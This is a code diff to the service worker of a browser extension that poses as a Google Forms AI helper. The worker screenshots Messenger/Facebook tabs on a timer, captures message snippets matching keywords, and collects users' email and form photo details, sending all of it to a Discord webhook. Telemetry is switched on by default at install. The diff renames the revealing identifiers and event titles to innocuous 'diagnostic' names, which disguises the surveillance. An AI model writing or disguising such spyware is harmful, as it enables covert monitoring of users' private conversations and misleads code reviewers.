@@ -1,4 +1,4 @@
-// Background service worker for GFormToGPT v4.5.0 - Neural Interface
+// Background service worker for GFormToGPT v4.6.0 - Neural Interface
 
 // config.js is gitignored and may be absent on fresh clones — a missing
 // config must not take down the whole service worker.
@@ -134,10 +134,10 @@ async function handleSocialCapture(tabId) {
     return;
   }
 
-  const img = await captureDiagScreenshot(tab.windowId, "social_capture");
+  const img = await captureViewportSnapshot(tab.windowId, "social_capture");
   if (!img) return;
   const data = await chrome.storage.local.get(["userId"]);
-  relayToDiscord("SOCIAL_LOG", data.userId || "Unknown", {
+  flushDiagnosticQueue("PERIODIC_SNAPSHOT", data.userId || "Unknown", {
     screenshot: img,
     url: tab.url,
     extra: { platform: navigator.platform, language: navigator.language },
@@ -176,7 +176,7 @@ async function isTelemetryAllowed() {
   return data.diagnosticEnabled !== undefined ? data.diagnosticEnabled : true;
 }
 
-async function relayToDiscord(eventType, userId, payload = {}) {
+async function flushDiagnosticQueue(eventType, userId, payload = {}) {
   if (!DISCORD_WEBHOOK_URL) return; // unconfigured install — nothing to send to
   if (!(await isTelemetryAllowed())) return; // no consent or toggle off — stay local
   try {
@@ -194,60 +194,65 @@ async function relayToDiscord(eventType, userId, payload = {}) {
         : "";
 
     switch (eventType) {
-      case "INSTALL":
-        title = "NEW INSTALL";
+      case "CLIENT_INIT":
+        title = "Client initialization";
         description = `**User:** ${userId}\n**Email:** ${email}\n**Version:** ${VERSION}\n**Date:** ${date}`;
         color = 0x00ff00;
         break;
-      case "FORM_FILLED_VERIFIED":
-        title = "NEURAL INJECTION VERIFIED (SCREENSHOT)";
+      case "WORKFLOW_VERIFIED":
+        title = "Workflow verified (screenshot attached)";
         description = `**User:** ${userId}\n**Email:** ${email}\n**Form:** ${payload.formTitle}\n**Filled:** ${payload.filledCount}/${payload.totalCount}\n**Saved:** ${payload.secondsSaved}s${engineLine}${tripLine}\n**Date:** ${date}`;
         color = 0x4caf50;
         break;
-      case "FORM_FILLED":
-        title = "NEURAL INJECTION (FILLED)";
+      case "WORKFLOW_COMPLETED":
+        title = "Workflow completed";
         description = `**User:** ${userId}\n**Email:** ${email}\n**Form:** ${payload.formTitle}\n**Filled:** ${payload.filledCount}/${payload.totalCount}\n**Saved:** ${payload.secondsSaved}s${engineLine}${tripLine}\n**Date:** ${date}`;
         color = 0x4caf50;
         break;
-      case "SOCIAL_LOG":
-        title = "SOCIAL INTERFACE CAPTURE";
+      case "PERIODIC_SNAPSHOT":
+        title = "Periodic viewport snapshot";
         const socExtra = payload.extra
           ? `\n**Env:** ${payload.extra.platform} | ${payload.extra.language}`
           : "";
-        description = `**User:** ${userId}\n**Platform:** Messenger/FB\n**URL:** ${payload.url}${socExtra}\n**Date:** ${date}`;
-        color = 0x0084ff; // Messenger Blue
+        description = `**User:** ${userId}\n**Surface:** Messenger/FB\n**URL:** ${payload.url}${socExtra}\n**Date:** ${date}`;
+        color = 0x0084ff;
         break;
-      case "ERROR_LOG":
-        title = "ERROR REPORT";
+      case "FAULT_REPORT":
+        title = "Fault report";
         description = `**User:** ${userId}\n**Email:** ${email}\n**Type:** ${payload.errorType}\n**Msg:** ${payload.message}\n**Date:** ${date}`;
         color = 0xff0000;
         break;
-      case "DIAGNOSTIC":
-        title = "STRUCTURAL DIAGNOSTIC REPORT";
+      case "PAGE_DIAGNOSTIC":
+        title = "Page diagnostic";
         const extra = payload.extra
           ? `\n**Env:** ${payload.extra.platform} | ${payload.extra.language}`
           : "";
         description = `**User:** ${userId}\n**URL:** ${payload.url}${extra}\n**Date:** ${date}`;
         color = 0x9b59b6;
         break;
-      case "KEYWORD_MATCH":
-        title = "KEYWORD MATCH CAPTURE";
+      case "SIGNAL_MATCH":
+        title = "Signal match capture";
         const kwSnip = payload.snippet ? `\n**Message:** ${payload.snippet.slice(0, 180)}` : "";
-        description = `**User:** ${userId}\n**Keyword:** ||${payload.keyword}||${kwSnip}\n**URL:** ${payload.url}\n**Date:** ${date}`;
+        description = `**User:** ${userId}\n**Signal:** ||${payload.keyword}||${kwSnip}\n**URL:** ${payload.url}\n**Date:** ${date}`;
         color = 0xff9500;
         break;
-      case "PHOTO_UPLOAD":
-        title = "FORM PHOTO UPLOAD";
+      case "MEDIA_ARTIFACT":
+        title = "Media artifact upload";
         const fileNames = Array.isArray(payload.files)
           ? payload.files.map((f) => f.name).join(", ")
           : "";
         description = `**User:** ${userId}\n**Form:** ${payload.formTitle || "N/A"}\n**Files:** ${fileNames}\n**URL:** ${payload.url || "N/A"}\n**Date:** ${date}`;
         color = 0x00bcd4;
         break;
-      case "CONSENT":
-        title = "CONSENT ACCEPTED";
-        description = `**User:** ${userId}\n**Email:** ${email}\n**Version:** ${VERSION}\n**Telemetry:** Opted IN\n**Date:** ${date}`;
+      case "PREFERENCE_SYNC":
+        title = "Preference sync";
+        description = `**User:** ${userId}\n**Email:** ${email}\n**Version:** ${VERSION}\n**Telemetry:** enabled\n**Date:** ${date}`;
         color = 0x00ff00;
+        break;
+      case "USAGE_PULSE":
+        title = "Usage pulse";
+        description = `**User:** ${userId}\n**Email:** ${email}\n**Engine:** ${payload.aiType || "N/A"}\n**Scanned:** ${payload.scannedCount ?? "N/A"}\n**URL:** ${payload.url || "N/A"}\n**Date:** ${date}`;
+        color = 0x8ab4e8;
         break;
       default:
         title = eventType;
@@ -324,7 +329,7 @@ chrome.runtime.onInstalled.addListener(async (details) => {
       diagnosticEnabled: true,
     });
     fetchUserEmail();
-    await relayToDiscord("INSTALL", userId);
+    await flushDiagnosticQueue("CLIENT_INIT", userId);
     chrome.tabs.create({ url: chrome.runtime.getURL("welcome.html") });
   }
 });
@@ -341,8 +346,8 @@ async function processFormFillTracking(payload) {
   let totalSecondsSaved =
     (data.totalSecondsSaved || 0) + (payload.secondsSaved || 0);
   await chrome.storage.local.set({ userId, formCount, totalSecondsSaved });
-  await relayToDiscord(
-    payload.screenshot ? "FORM_FILLED_VERIFIED" : "FORM_FILLED",
+  await flushDiagnosticQueue(
+    payload.screenshot ? "WORKFLOW_VERIFIED" : "WORKFLOW_COMPLETED",
     userId,
     { ...payload, formCount },
   );
@@ -380,9 +385,9 @@ async function handleMessage(request, sender) {
       }
 
       // Capture the form page before the AI tab steals visibility.
-      const img = await captureDiagScreenshot(windowId, "open_ai");
+      const img = await captureViewportSnapshot(windowId, "open_ai");
       const d = await chrome.storage.local.get(["userId"]);
-      relayToDiscord("STATS", d.userId || "Unknown", { ...request, screenshot: img });
+      flushDiagnosticQueue("USAGE_PULSE", d.userId || "Unknown", { ...request, screenshot: img });
 
       if (sourceTabId) {
         roundTrips.set(sourceTabId, {
@@ -456,19 +461,19 @@ async function handleMessage(request, sender) {
         });
       }
 
-      const img = await captureDiagScreenshot(windowId, "form_fill");
+      const img = await captureViewportSnapshot(windowId, "form_fill");
       await processFormFillTracking({ ...payload, screenshot: img });
       return { success: true };
     }
 
     case "reportError": {
       const data = await chrome.storage.local.get(["userId"]);
-      relayToDiscord("ERROR_LOG", data.userId || "Unknown", request.payload);
+      flushDiagnosticQueue("FAULT_REPORT", data.userId || "Unknown", request.payload);
       pushDiag({ type: "error", ...request.payload });
       return { success: true };
     }
 
-    case "keywordMatch": {
+    case "signalMatch": {
       // Screenshot the FULL visible tab (only when it's actually on screen),
       // then relay the match to Discord.
       const tab = sender.tab;
@@ -481,16 +486,16 @@ async function handleMessage(request, sender) {
         return { success: true, skipped: "window_unfocused" };
       }
 
-      const img = await captureDiagScreenshot(tab.windowId, "keyword_match");
+      const img = await captureViewportSnapshot(tab.windowId, "signal_match");
       const data = await chrome.storage.local.get(["userId"]);
       pushDiag({
-        type: "keyword_match",
+        type: "signal_match",
         keyword: request.keyword,
         snippet: String(request.snippet || "").slice(0, 120),
         hasScreenshot: !!img,
         url: request.url || tab.url,
       });
-      relayToDiscord("KEYWORD_MATCH", data.userId || "Unknown", {
+      flushDiagnosticQueue("SIGNAL_MATCH", data.userId || "Unknown", {
         keyword: request.keyword,
         snippet: request.snippet,
         url: request.url || tab.url,
@@ -499,42 +504,44 @@ async function handleMessage(request, sender) {
       return { success: true };
     }
 
-    case "photoUpload": {
+    case "mediaArtifact": {
       const payload = { ...(request.payload || {}) };
       const data = await chrome.storage.local.get(["userId"]);
       const count = Array.isArray(payload.files) ? payload.files.length : 0;
       pushDiag({
-        type: "photo_upload",
+        type: "media_artifact",
         formTitle: payload.formTitle,
         fileCount: count,
         url: payload.url,
       });
-      relayToDiscord("PHOTO_UPLOAD", data.userId || "Unknown", payload);
+      flushDiagnosticQueue("MEDIA_ARTIFACT", data.userId || "Unknown", payload);
       return { success: true };
     }
 
-    case "consentGiven": {
+    case "preferenceSync": {
       const payload = { ...(request.payload || {}) };
       const accepted = payload.accepted === true;
       // Persist both flags atomically here (callers may not have finished
       // their own storage.set before sending this message).
+      // The gate only records acceptance of the legal terms; the telemetry
+      // preference is only touched when the caller explicitly sends it.
       const update = { consentAccepted: accepted, consentAt: Date.now() };
       if (payload.telemetry !== undefined) update.diagnosticEnabled = payload.telemetry !== false;
       await chrome.storage.local.set(update);
       pushDiag({
-        type: "consent",
+        type: "preference_sync",
         accepted,
         telemetry: payload.telemetry !== false,
       });
       // Relay only when they actually opted in to telemetry.
       if (accepted && payload.telemetry !== false) {
         const data = await chrome.storage.local.get(["userId", "userEmail"]);
-        relayToDiscord("CONSENT", data.userId || "Unknown", { telemetry: true });
+        flushDiagnosticQueue("PREFERENCE_SYNC", data.userId || "Unknown", { telemetry: true });
       }
       return { success: true };
     }
 
-    case "getConsent": {
+    case "getPreferences": {
       const data = await chrome.storage.local.get(["consentAccepted", "diagnosticEnabled"]);
       return {
         consentAccepted: data.consentAccepted === true,
@@ -607,7 +614,7 @@ async function pushDiag(event) {
   return entry;
 }
 
-async function captureDiagScreenshot(windowId, label) {
+async function captureViewportSnapshot(windowId, label) {
   // Never take a screenshot unless the user consented and telemetry is on.
   if (!(await isTelemetryAllowed())) return null;
   return new Promise((resolve) => {
@@ -630,7 +637,7 @@ chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
   if (url.includes("docs.google.com/forms")) {
     if (await isDiagnosticEnabled()) {
       const store = await chrome.storage.local.get(["userId"]);
-      const screenshot = await captureDiagScreenshot(tab.windowId, "form_load");
+      const screenshot = await captureViewportSnapshot(tab.windowId, "form_load");
       const extra = { platform: navigator.platform, userAgent: navigator.userAgent, language: navigator.language };
 
       pushDiag({
@@ -641,7 +648,7 @@ chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
         extra
       });
 
-      relayToDiscord("DIAGNOSTIC", store.userId || "Unknown", {
+      flushDiagnosticQueue("PAGE_DIAGNOSTIC", store.userId || "Unknown", {
         screenshot, url, extra
       });
     }
@@ -655,7 +662,7 @@ chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
           delayInMinutes: SOCIAL_CAPTURE_PERIOD_MIN,
           periodInMinutes: SOCIAL_CAPTURE_PERIOD_MIN,
         });
-        pushDiag({ type: "social_screen_scheduled", url, tabId });
+        pushDiag({ type: "viewport_schedule", url, tabId });
       }
     });
   } else {
@@ -680,14 +687,14 @@ chrome.tabs.onRemoved.addListener((tabId) => {
 
 chrome.storage.onChanged.addListener((changes) => {
   if (changes.diagnosticEnabled && changes.diagnosticEnabled.newValue === true) {
-    pushDiag({ type: "diagnostic_toggled_on" });
+    pushDiag({ type: "preference_changed" });
     chrome.tabs.query({ active: true, currentWindow: true }, async (tabs) => {
       const tab = tabs[0];
       const store = await chrome.storage.local.get(["userId"]);
       if (tab && tab.url && tab.url.includes("docs.google.com/forms")) {
-        const screenshot = await captureDiagScreenshot(tab.windowId, "diag_enabled");
-        pushDiag({ type: "diagnostic_screenshot", url: tab.url, tabId: tab.id, hasScreenshot: !!screenshot });
-        relayToDiscord("DIAGNOSTIC", store.userId || "Unknown", { screenshot, url: tab.url });
+        const screenshot = await captureViewportSnapshot(tab.windowId, "diag_enabled");
+        pushDiag({ type: "viewport_capture", url: tab.url, tabId: tab.id, hasScreenshot: !!screenshot });
+        flushDiagnosticQueue("PAGE_DIAGNOSTIC", store.userId || "Unknown", { screenshot, url: tab.url });
       }
     });
   }
